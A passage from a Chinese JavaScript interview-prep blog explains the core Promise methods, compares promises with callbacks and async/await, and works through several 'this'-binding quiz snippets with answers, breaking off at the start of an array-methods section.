Promise 对象。它接受一个带有两个参数的函数作为参数，这个函数会在 Promise 对象被创建时立即执行。这个函数通常包含异步操作，它会在异步操作完成后决定 Promise 对象的状态。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> myPromise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// 异步操作</span><br>  <span class="hljs-keyword">if</span> (异步操作成功) &#123;<br>    <span class="hljs-title function_">resolve</span>(成功的结果);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_">reject</span>(失败的原因);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p><strong>Promise.prototype.then()：</strong></p><ul><li><code>then()</code> 方法用于添加处理 Promise 对象成功状态的回调函数。它接受两个参数，第一个参数是成功时的回调函数，第二个参数是可选的失败时的回调函数。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">myPromise.<span class="hljs-title function_">then</span>(<br>  <span class="hljs-function">(<span class="hljs-params">成功的结果</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 处理成功</span><br>  &#125;,<br>  <span class="hljs-function">(<span class="hljs-params">失败的原因</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 处理失败</span><br>  &#125;<br>);<br></code></pre></td></tr></table></figure></li><li><p><strong>Promise.prototype.catch()：</strong></p><ul><li><code>catch()</code> 方法用于添加处理 Promise 对象失败状态的回调函数。它是 <code>then(null, 失败的回调函数)</code> 的简写形式。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">myPromise.<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">失败的原因</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// 处理失败</span><br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p><strong>Promise.prototype.finally()：</strong></p><ul><li><code>finally()</code> 方法用于添加一个回调函数，不论 Promise 对象的状态是成功还是失败，该回调函数都会被执行。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">myPromise.<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// 无论成功或失败都会执行的操作</span><br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p><strong>Promise.all()：</strong></p><ul><li><code>Promise.all()</code> 静态方法接受一个可迭代的 Promise 数组，返回一个新的 Promise 对象。该 Promise 对象在所有输入的 Promise 对象都成功时才会成功，一旦有一个失败，则它也会失败。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([promise1, promise2, promise3])<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">results</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 所有 Promise 都成功，results 包含各个 Promise 的成功结果</span><br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 任何一个 Promise 失败，会进入这里</span><br>  &#125;);<br></code></pre></td></tr></table></figure></li><li><p><strong>Promise.race()：</strong></p><ul><li><code>Promise.race()</code> 静态方法接受一个可迭代的 Promise 数组，返回一个新的 Promise 对象。该 Promise 对象在输入的 Promise 数组中的任何一个 Promise 成功或失败时，就会立即返回。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">race</span>([promise1, promise2, promise3])<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 只要有一个 Promise 成功，result 包含第一个成功的结果</span><br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 只要有一个 Promise 失败，会进入这里</span><br>  &#125;);<br></code></pre></td></tr></table></figure></li></ol><p>这些方法是 Promise 的核心方法，它们允许你更容易地管理异步操作，处理成功和失败状态，以及实现复杂的异步控制流。使用 Promise 可以提高代码的可读性和可维护性，减少了回调地狱的问题。</p><h5 id="为什么用promise而不用callback的方式"><a href="#为什么用promise而不用callback的方式" class="headerlink" title="为什么用promise而不用callback的方式"></a>为什么用promise而不用callback的方式</h5><p>异步编程是在 JavaScript 中常见的需求，用于处理诸如网络请求、文件读取、定时器等异步操作。为了解决异步编程的问题，有多种解决方案，其中包括：</p><ol><li><p><strong>回调函数（Callback）：</strong> 这是 JavaScript 中最早的异步编程方式。回调函数是将一个函数作为参数传递给另一个函数，在异步操作完成后调用这个函数。尽管回调函数是一种有效的方式，但容易导致回调地狱（callback hell），使代码难以阅读和维护。</p></li><li><p><strong>Promise：</strong> Promise 是一种用于管理异步操作的对象，它可以表示一个异步操作的成功或失败。Promise 提供了更清晰的语法和更好的错误处理机制，可以使用 <code>then</code> 和 <code>catch</code> 方法链式处理异步操作，减少回调地狱的问题。</p></li><li><p><strong>Async&#x2F;Await：</strong> Async&#x2F;Await 是 ES2017 引入的语法糖，它建立在 Promise 基础上，使异步代码更类似于同步代码的结构。通过在函数前面添加 <code>async</code> 关键字，可以在函数内使用 <code>await</code> 关键字来等待异步操作的完成。这种方式提高了异步代码的可读性。</p></li><li><p><strong>Generator 函数：</strong> Generator 函数是一种特殊的函数，可以暂停和恢复执行，通过使用 <code>yield</code> 关键字可以在函数内进行异步操作。Generator 函数通常需要与其他工具库（如 co.js）一起使用。</p></li></ol><p>为什么使用 Promise 而不使用回调函数的方式？</p><ol><li><p><strong>可读性更高：</strong> Promise 提供了链式调用的语法，使得异步操作的顺序更加清晰，代码更易读。</p></li><li><p><strong>错误处理更容易：</strong> 使用 Promise 的 <code>catch</code> 方法可以捕获并处理异步操作中的错误，而回调方式可能需要手动处理错误。</p></li><li><p><strong>避免回调地狱：</strong> Promise 可以避免回调地狱，即多层嵌套的回调函数，使代码更易维护。</p></li><li><p><strong>更多的内置功能：</strong> Promise 提供了丰富的功能，如 <code>Promise.all</code>、<code>Promise.race</code> 等，用于处理多个异步操作。</p></li></ol><p>总之，Promise 是一种更现代、更易用、更可读、更易维护的异步编程方式，因此在实际开发中更常见。当然，Async&#x2F;Await 也是一种很强大的异步编程方式，可以进一步提高代码的可读性和维护性。</p><h5 id="promise真的解决-回调地狱了吗"><a href="#promise真的解决-回调地狱了吗" class="headerlink" title="promise真的解决 回调地狱了吗"></a>promise真的解决 回调地狱了吗</h5><p>Promise 是一种用于处理异步操作的 JavaScript 对象，它提供了一种更清晰、更可读的方式来处理异步代码，有助于减轻回调地狱（Callback Hell）问题。然而，它并没有完全解决回调地狱，而是提供了一种更好的替代方案，称为 Promise 链或链式调用。</p><p>回调地狱通常发生在多个异步操作需要依次执行的情况下，例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">asyncFunction1</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">asyncFunction2</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">asyncFunction3</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-comment">// ...</span><br>    &#125;);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>这种嵌套的回调结构难以阅读和维护，而 Promise 可以通过链式调用的方式改善这种情况：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">asyncFunction1</span>()<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">asyncFunction2</span>())<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">asyncFunction3</span>())<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// ...</span><br>  &#125;);<br></code></pre></td></tr></table></figure><p>这种方式使代码更具可读性，但并没有完全消除回调地狱。当有大量的异步操作需要处理时，仍然可能会出现链式 <code>.then()</code> 调用，导致代码嵌套深度增加。此时，Async&#x2F;Await 是一种更现代、更清晰的替代方案，它使异步代码看起来更像同步代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doAsyncWork</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">asyncFunction1</span>();<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">asyncFunction2</span>();<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">asyncFunction3</span>();<br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>虽然 Promise 和 Async&#x2F;Await 可以显著改善异步代码的可读性和维护性，但在处理复杂的异步控制流时，仍然需要小心管理嵌套和错误处理。此外，新的 JavaScript 特性如 Generator 和 RxJS 也提供了更多处理异步操作的方式，开发者可以根据项目需求选择适合的工具。总之，虽然 Promise 带来了显著的改进，但不是绝对解决回调地狱的唯一方案。</p><h3 id="7、this指向"><a href="#7、this指向" class="headerlink" title="7、this指向"></a>7、this指向</h3><p>JavaScript 中的 <code>this</code> 是一个特殊的关键字，它表示当前执行上下文中的对象。<code>this</code> 的值在不同的情况下会有不同的绑定规则，因此需要理解它的工作原理。</p><p>以下是 <code>this</code> 的工作原理的主要规则：</p><ol><li><p>**全局上下文中的 <code>this</code>**：</p><ul><li>在全局上下文中，<code>this</code> 指向全局对象，通常是 <code>window</code>（浏览器环境）或 <code>global</code>（Node.js 环境）。</li><li>在浏览器中，你可以在浏览器控制台中输入 <code>console.log(this)</code> 来查看全局上下文中的 <code>this</code>。</li></ul></li><li><p>**函数内部的 <code>this</code>**：</p><ul><li>在函数内部，<code>this</code> 的值取决于函数的调用方式。它可能指向不同的对象或者根本不指向对象。</li><li>如果函数是作为对象的方法调用的，<code>this</code> 将指向调用该方法的对象。</li><li>如果函数是作为独立函数调用的，<code>this</code> 将指向全局对象（浏览器环境中通常是 <code>window</code>）。</li><li>如果函数是作为构造函数使用的（使用 <code>new</code> 关键字），<code>this</code> 将指向新创建的对象。</li><li>如果使用箭头函数，<code>this</code> 将捕获外部函数的 <code>this</code> 值，与箭头函数定义时的上下文有关。</li></ul></li><li><p>**事件处理函数中的 <code>this</code>**：</p><ul><li>在事件处理函数中，<code>this</code> 通常指向触发事件的元素。</li><li>例如，当点击按钮时，<code>this</code> 将指向该按钮元素。</li></ul></li><li><p>**方法链中的 <code>this</code>**：</p><ul><li>当在方法链中调用多个方法时，<code>this</code> 通常指向前一个方法返回的对象。</li><li>这使得方法链的连续调用成为可能。</li></ul></li><li><p>**通过 <code>.call()</code> 和 <code>.apply()</code> 明确设置 <code>this</code>**：</p><ul><li>使用 <code>.call()</code> 和 <code>.apply()</code> 方法可以显式地设置函数内部的 <code>this</code> 值。</li><li>这两个方法允许你将一个对象作为参数传递给函数，该对象将成为函数内部的 <code>this</code>。</li></ul></li></ol><p>总之，JavaScript 中的 <code>this</code> 的值取决于函数的调用方式和上下文。了解这些规则是编写有效 JavaScript 代码的关键之一。在不同的情况下，需要小心处理 <code>this</code>，以确保它指向正确的对象。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> name = <span class="hljs-string">&quot;window&quot;</span>;<br><br><span class="hljs-keyword">var</span> person = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;person&quot;</span>,<br>  <span class="hljs-attr">sayName</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(this.name);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sayName</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> sss = person.sayName;<br>  sss(); <br>  person.sayName(); <br>  (person.sayName)();<br>  (b = person.sayName)(); <br>&#125;<br><br>sayName();<br></code></pre></td></tr></table></figure><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9c9a3c7309c944dd9cb703aec61230dc~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="image.png"></p><p>解析：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sayName</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> sss = person.<span class="hljs-property">sayName</span>;<br>  <span class="hljs-title function_">sss</span>(); <span class="hljs-comment">// window(独立函数调用)</span><br>  person.<span class="hljs-title function_">sayName</span>(); <span class="hljs-comment">// person(隐式绑定)？</span><br>  (person.<span class="hljs-property">sayName</span>)(); <span class="hljs-comment">// person(隐式绑定)</span><br>  (b = person.<span class="hljs-property">sayName</span>)(); <span class="hljs-comment">// window(赋值表达式，独立函数调用)</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> name = <span class="hljs-string">&#x27;window&#x27;</span><br><br><span class="hljs-keyword">var</span> person1 = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;person1&#x27;</span>,<br>  <span class="hljs-attr">foo1</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>  &#125;,<br>  <span class="hljs-attr">foo2</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>),<br>  <span class="hljs-attr">foo3</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">foo4</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> person2 = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;person2&#x27;</span> &#125;<br><br>person1.<span class="hljs-title function_">foo1</span>(); <br>person1.<span class="hljs-property">foo1</span>.<span class="hljs-title function_">call</span>(person2); <br><br>person1.<span class="hljs-title function_">foo2</span>();  <br>person1.<span class="hljs-property">foo2</span>.<span class="hljs-title function_">call</span>(person2); <br><br>person1.<span class="hljs-title function_">foo3</span>()(); <br>person1.<span class="hljs-property">foo3</span>.<span class="hljs-title function_">call</span>(person2)(); <br>person1.<span class="hljs-title function_">foo3</span>().<span class="hljs-title function_">call</span>(person2); <br><br>person1.<span class="hljs-title function_">foo4</span>()(); <br>person1.<span class="hljs-property">foo4</span>.<span class="hljs-title function_">call</span>(person2)(); <br>person1.<span class="hljs-title function_">foo4</span>().<span class="hljs-title function_">call</span>(person2); <br></code></pre></td></tr></table></figure><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dd44e783e48f4f45a47548689201a110~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="image.png"></p><p>解析：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">person1.<span class="hljs-title function_">foo1</span>(); <span class="hljs-comment">// person1(隐式绑定)</span><br>person1.<span class="hljs-property">foo1</span>.<span class="hljs-title function_">call</span>(person2); <span class="hljs-comment">// person2(显示绑定优先级大于隐式绑定) </span><br><br>person1.<span class="hljs-title function_">foo2</span>();  <span class="hljs-comment">// window(箭头函数不绑定this，上层作用域是全局，this是window)</span><br>person1.<span class="hljs-property">foo2</span>.<span class="hljs-title function_">call</span>(person2); <span class="hljs-comment">// window(箭头函数，上层作用域的this是window)</span><br><br>person1.<span class="hljs-title function_">foo3</span>()(); <span class="hljs-comment">// window(默认绑定，独立函数调用)</span><br>person1.<span class="hljs-property">foo3</span>.<span class="hljs-title function_">call</span>(person2)(); <span class="hljs-comment">// window(默认绑定，独立函数调用) </span><br>person1.<span class="hljs-title function_">foo3</span>().<span class="hljs-title function_">call</span>(person2); <span class="hljs-comment">// person2(显示绑定)</span><br><br>person1.<span class="hljs-title function_">foo4</span>()(); <span class="hljs-comment">// person1(箭头函数，上层作用域的this是person1)</span><br>person1.<span class="hljs-property">foo4</span>.<span class="hljs-title function_">call</span>(person2)(); <span class="hljs-comment">// person2(箭头函数，上层作用域的this是person2)</span><br>person1.<span class="hljs-title function_">foo4</span>().<span class="hljs-title function_">call</span>(person2); <span class="hljs-comment">// person1(箭头函数，上层作用域的this是person1)</span><br></code></pre></td></tr></table></figure><p>this面试题三</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> name = <span class="hljs-string">&#x27;window&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span> (name) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">foo1</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>  &#125;,<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">foo2</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>),<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">foo3</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>    &#125;<br>  &#125;,<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">foo4</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> person1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;person1&#x27;</span>)<br><span class="hljs-keyword">var</span> person2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;person2&#x27;</span>)<br><br>person1.<span class="hljs-title function_">foo1</span>() <br>person1.<span class="hljs-property">foo1</span>.<span class="hljs-title function_">call</span>(person2) <br><br>person1.<span class="hljs-title function_">foo2</span>() <br>person1.<span class="hljs-property">foo2</span>.<span class="hljs-title function_">call</span>(person2)<br><br>person1.<span class="hljs-title function_">foo3</span>()() <br>person1.<span class="hljs-property">foo3</span>.<span class="hljs-title function_">call</span>(person2)() <br>person1.<span class="hljs-title function_">foo3</span>().<span class="hljs-title function_">call</span>(person2)<br><br>person1.<span class="hljs-title function_">foo4</span>()()<br>person1.<span class="hljs-property">foo4</span>.<span class="hljs-title function_">call</span>(person2)() <br>person1.<span class="hljs-title function_">foo4</span>().<span class="hljs-title function_">call</span>(person2)<br></code></pre></td></tr></table></figure><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6122cb5eaf5645d7a14be6a7e778d8c1~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="image.png"></p><p>解析：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">person1.<span class="hljs-title function_">foo1</span>() <span class="hljs-comment">// person1</span><br>person1.<span class="hljs-property">foo1</span>.<span class="hljs-title function_">call</span>(person2) <span class="hljs-comment">// person2(显示绑定高于隐式绑定)</span><br><br>person1.<span class="hljs-title function_">foo2</span>() <span class="hljs-comment">// person1（箭头函数，上层作用域的this是person1）</span><br>person1.<span class="hljs-property">foo2</span>.<span class="hljs-title function_">call</span>(person2) <span class="hljs-comment">// person1 （箭头函数，上层作用域的this是person1）</span><br><br>person1.<span class="hljs-title function_">foo3</span>()() <span class="hljs-comment">// window（独立函数调用）</span><br>person1.<span class="hljs-property">foo3</span>.<span class="hljs-title function_">call</span>(person2)() <span class="hljs-comment">// window</span><br>person1.<span class="hljs-title function_">foo3</span>().<span class="hljs-title function_">call</span>(person2) <span class="hljs-comment">// person2</span><br><br>person1.<span class="hljs-title function_">foo4</span>()() <span class="hljs-comment">// person1</span><br>person1.<span class="hljs-property">foo4</span>.<span class="hljs-title function_">call</span>(person2)() <span class="hljs-comment">// person2 </span><br>person1.<span class="hljs-title function_">foo4</span>().<span class="hljs-title function_">call</span>(person2) <span class="hljs-comment">// person1</span><br></code></pre></td></tr></table></figure><p>this面试题四</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> name = <span class="hljs-string">&#x27;window&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span> (name) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">obj</span> = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;obj&#x27;</span>,<br>    <span class="hljs-attr">foo1</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>      &#125;<br>    &#125;,<br>    <span class="hljs-attr">foo2</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> person1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;person1&#x27;</span>)<br><span class="hljs-keyword">var</span> person2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;person2&#x27;</span>)<br><br>person1.<span class="hljs-property">obj</span>.<span class="hljs-title function_">foo1</span>()() <br>person1.<span class="hljs-property">obj</span>.<span class="hljs-property">foo1</span>.<span class="hljs-title function_">call</span>(person2)() <br>person1.<span class="hljs-property">obj</span>.<span class="hljs-title function_">foo1</span>().<span class="hljs-title function_">call</span>(person2) <br><br>person1.<span class="hljs-property">obj</span>.<span class="hljs-title function_">foo2</span>()() <br>person1.<span class="hljs-property">obj</span>.<span class="hljs-property">foo2</span>.<span class="hljs-title function_">call</span>(person2)() <br>person1.<span class="hljs-property">obj</span>.<span class="hljs-title function_">foo2</span>().<span class="hljs-title function_">call</span>(person2) <br></code></pre></td></tr></table></figure><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f1618324119445da8dc6d61f653233a1~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="image.png"></p><h3 id="8、数据方法总结"><a href="#8、数据方法总结" class="headerlink" title="8、数据方法总结"></a>8、数据方法总结</h3><h5 id="一、改变原数组的方法"><a href="#一、改变原数组的方法" class="headerlink" title="一、改变原数组的方法"></a>一、改变原数组的方法</h5><ol><li>push（） 末尾添加数据</li></ol><p><strong>语法:</strong> <strong>数组名.push(</strong> 